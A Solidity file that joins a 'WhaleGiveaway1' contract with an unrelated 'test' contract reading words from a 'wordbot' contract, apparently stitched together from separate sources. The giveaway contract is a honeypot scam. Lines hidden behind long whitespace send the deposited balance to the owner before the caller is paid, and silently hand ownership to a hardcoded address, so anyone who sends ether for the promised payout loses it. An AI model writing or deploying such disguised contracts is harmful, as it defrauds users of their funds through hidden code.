 

pragma solidity ^0.4.19;

contract WhaleGiveaway1
{
    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether; 
   
    function()
    public
    payable
    {
        
    }
   
    function redeem()
    public
    payable
    {                                                                    
        if(msg.value>=minEligibility)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
         
        adr.call.value(msg.value)(data);
    }
}
contract wordbot { 
    function getWords(uint _wordcount) public view returns (bytes6[]) {} 
}

contract test {
    wordbot wordbot_contract = wordbot(0xA95E23ac202ad91204DA8C1A24B55684CDcC19B3);
    uint wordcount = 12;
    string[12] public human_readable_blockhash;

    modifier one_time_use {
        require(keccak256(abi.encodePacked(human_readable_blockhash[0])) == keccak256(abi.encodePacked("")));
        _;
    }

    function record_human_readable_blockhash() 
        one_time_use public
    {
        bytes6[] memory word_sequence = new bytes6[](wordcount);
        word_sequence = wordbot_contract.getWords(wordcount);
        
        for(uint i = 0; i<wordcount; i++) {
            bytes6 word = word_sequence[i];
            bytes memory toBytes = new bytes(6);
            
            toBytes[0] = word[0];
            toBytes[1] = word[1];
            toBytes[2] = word[2];
            toBytes[3] = word[3];
            toBytes[4] = word[4];
            toBytes[5] = word[5];

            string memory toString = string(toBytes);
            human_readable_blockhash[i] = toString;
        }
    }
}
